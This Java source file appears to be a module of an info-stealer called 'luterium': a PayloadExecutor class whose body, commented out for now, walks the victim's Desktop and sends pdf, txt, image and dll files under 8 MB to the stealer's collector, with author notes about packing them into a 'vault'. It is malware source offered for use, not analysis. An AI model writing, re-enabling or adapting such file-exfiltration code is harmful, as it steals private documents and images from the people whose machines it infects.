package dev.peter.luterium.features;

import dev.peter.luterium.payload.PayloadExecutor;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author Peter
 * @since 09/06/2022
 * Gets useful files from Desktop(pdf, txt, png, jpg, jpeg and dll for now, I could add more but I'm just too lazy).
 *
 * I'm going to comment this for now, since it will probably mess with the file size of the vault, and isn't REALLY useful to be honest.
 * If you want to enable this in the future, don't forget to pack each file to their respective zip file and add them to the vault,
 * I could do that now, but I'm WAY too lazy to do that right now :)
 * - Peter 09/29/2025
 */

public class UsefulFiles implements PayloadExecutor {
    @Override
    public void execute() throws Exception {
        /*
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".pdf"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));

        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".txt"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));

        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".jpg"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));

        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".png"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));

        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".jpeg"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));

        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".dll"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));
         */
    }
}
